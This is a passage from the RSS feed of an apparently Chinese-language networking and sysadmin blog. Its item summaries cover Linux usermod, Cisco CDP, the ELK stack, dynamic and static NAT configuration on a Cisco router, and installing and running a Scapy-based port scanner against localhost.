變更帳號的使用到期日，過期該帳號無法使用 -u UID 變更帳號的 UID 編號 -l 帳號名稱 變更原帳號的名稱 修改使用者帳號 # id tom uid=1004(tom) gid=1001(rd) groups=1001(rd),1004(manager) # usermod -G manager,sales tom # usermod 修改使用者帳號， -G 加入附屬群組(已存在的帳號) # id tom uid=1004(tom) gid=1001(rd) groups=1001(rd),1004(manager),1005(sales)</description></item><item><title>CDP</title><link>https://cch0124.github.io/blog/2018-08-19-cdp/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2018-08-19-cdp/</guid><description>CDP 在規劃一個網路架構時，如果不小心失去網路架構的資訊，應該會造成管理上的混亂，如果該環境設備都是 Cisco 設備，則可透過 CDP 協定探索收集到全部 Cisco 網路設備的軟硬體資訊，立即重建網路拓樸資訊。
利用 CDP 協定交換資訊 Cisco 網路設備會定期與周遭的 Cisco 網路設備進行資訊交換的動作，要達到這樣定期的資料交換動作，就必須透過 CDP 協定才行。CDP（Cisco Discovery Protocol）是 Cisco 的專利，運行於 OSI 七層協定之中第二層 Data Link Layer 的協定。可以透過它來讓設備相互收集設備的資訊，如：ISO 版本、IP 位址等。
CDP 協定所提供的資訊 設備ID 設備的名稱 第三層的IP位址清單 來源端和目的端埠名稱，例如：ethernet0 埠的ID 所支援的功能列表 硬體平台 硬體型號 關閉或開啟 CDP 協定的指令 以下範例拓樸圖
開啟或關閉 CDP R1(config)#no cdp run R1(config)#cdp run 關閉或重啟某介面的 CDP R1(config-if)#no cdp enable R1(config-if)#cdp enable CDP 協定的設定方式 顯示CDP協定資訊的指令 Cisco 路由器上的 CDP 協定可以開啟或關閉，預設為開啟。</description></item><item><title>ELK</title><link>https://cch0124.github.io/project/2018-07-11-elk/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/project/2018-07-11-elk/</guid><description>ELK ELK 是指 ElasticSearch 、 Logstash 和 Kibana 三個 open-source 的集合套件，這三個軟體可以組成一套日誌(log)分析架構。
如今資料量動輒 &amp;ldquo;T&amp;rdquo; 或幾個 &amp;ldquo;P&amp;rdquo; 等級的數據，正常的文字編輯器或數據處理軟體等工具往往都難以應對，但對原始的大數據進行分析，能提高對數據的洞察力。ELK 可以對大量Log 的數據處理，如索引、分析，當對這大量進行良好的控管，將可以依照這些數據得到一些有用的資訊。
Log 我是應用在 Log 的蒐集上因此小提一下 Log。
Log 就是系統或設備在連線和運作時所產生的記錄，藉由 Log 的蒐集和分析，讓 IT 人員能夠監控系統的運作狀態，判斷可能發生的事件，以及分析資料存取行為和使用者的活動。
網路是否遭到惡意的嘗試入侵？ 系統和網路運作是否有異常情況發生？ IT 人員只要對 Log 進行監控，就可以判斷可能的問題，或著狀況不清楚時，透過 Log 的查詢分析，可在較短時間內找出原因。
架構 核心架構介紹 Elasticsearch 全文檢索的搜索引擎 擴展性高 分散式系統的功能 索引方式管理維護數據 透過 API 取得相關數據的查詢、聚合等 Logstash 分析數據的入口點 支持很多的 Input、Output 數據套件 其中一種是將數據傳入至 Elasticsearch 蒐集原始數據 修改（過濾）數據，並將其數據轉換成有意義的資訊 完成數據格式化和重新組織數據 資料進入 logstash 流程 input file TCP UDP syslog beat 等等 filter grok mutate drop 等等 output Elasticsearch google_bigquery 等等 其中 Data Source 可以是 beat 或讀檔等方式傳入 Logstash，在 filter 部分可以處裡傳入的數據，最橫在把資訊傳至 Elasticsearch。</description></item><item><title>NAT</title><link>https://cch0124.github.io/blog/2019-10-12-nat-dynamic/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2019-10-12-nat-dynamic/</guid><description>什麼是 NAT 因為 IPv4 的地址將用盡，如果沒有 NAT 技術的話將導致某一些人無法存取網路。在 ISP 提供的 IP 可分為，動態 IP 與靜態 IP。動態 IP 可以想成從 ISP 那邊自動獲取 IP 類似於 DHCP；靜態 IP 就是給一個 Global IP 位置且它是收費的。隨著物聯網裝置的需求想必 IPv4 是不夠用，因此就有 NAT 去提升效率，藉由一個 Global IP 來對其下的組織或客戶端實現 NAT 並存取網際網路。
NAT 通常會配置兩個網路，該 NAT 可以隱藏內部訊息，其流程大致上是把私有 IP 轉換為 Global IP，在將其封包轉發至目的地，這樣也就提供對內的安全性。
NAT 可以幫忙解決 IPv4 不足問題也可以有隱藏 IP 功能提高安全性。但它也會有一些缺點，像是要保留傳入與傳出的 IPv4 這將對記憶體或 CPU 帶來負擔，因為多了 NAT 轉換想必延遲一定會有，除此之外它變得不可追溯，因此在做除錯時會帶來麻煩。
環境設置 下圖為實驗環境，兩台客戶端和一台可通往 Cloud1 的 ISP。
兩台客戶端使用 Vmware 虛擬機網路都為同一個 host only，接著用 netplan 配置虛擬機 IP 和 gateway，這 gateway 將會是 R1 的 f0/0 接口的 IP，這邊有 netplan 教學鏈結。圖中的 Cloud1 使用 Vmware 提供的可上網的網路適配器，記住上圖的 IP 設置應當依照實驗環境而設置。</description></item><item><title>port scanner</title><link>https://cch0124.github.io/blog/2018-08-03-port-scanner/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2018-08-03-port-scanner/</guid><description>Scapy 安裝及實作程式碼介紹 env ubuntu scapy 套件 python3 scapy 套件安裝 git clone https://github.com/secdev/scapy cd scapy sudo python3 setup.py install 因為 windows 沒 fork 功能，所以只能在 unix 環境執行
scapy install
執行與驗證 執行 itachi@swarm-master:~/python$ sudo python3 PortScanner.py [sudo] password for itachi: [*] Enter Target IP Address: 127.0.0.1 [*] Enter Minumum Port Number: 10 [*] Enter Maximum Port Number: 90 [*] Target is Up, Beginning Scan... [*] Scanning Started at 10:54:30!</description></item><item><title>Static NAT</title><link>https://cch0124.github.io/blog/2019-10-13-static-nat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2019-10-13-static-nat/</guid><description>環境 配置一台 host only 的虛擬機和一台 R1 路由器以及可以連至網際網路的 Cloud1。該 Cloud1 使用的是手機 USB 出來的網路適配器。
配置 R1 配置 f0/0 的 IP，對於這個 f0/0 來說它是虛擬機的 gateway，只要封包不知道要往哪邊走都會網 f0/0 丟。
R1(config)#interface fastEthernet 0/0 R1(config-if)#ip address 192.168.245.254 255.255.255.0 R1(config-if)#no shutdown 配置 R1 的 Outside 接口，使用 DHCP 方式向 Cloud1 請求 IP。
R1(config)#interface fastEthernet 1/0 R1(config-if)#no shutdown R1(config-if)#ip address dhcp 確認有無配置到 IP。
R1(config-if)#do sh ip int brief Interface IP-Address OK? Method Status Protocol FastEthernet0/0 192.168.245.254 YES manual up up FastEthernet1/0 192.</description></item></channel></rss>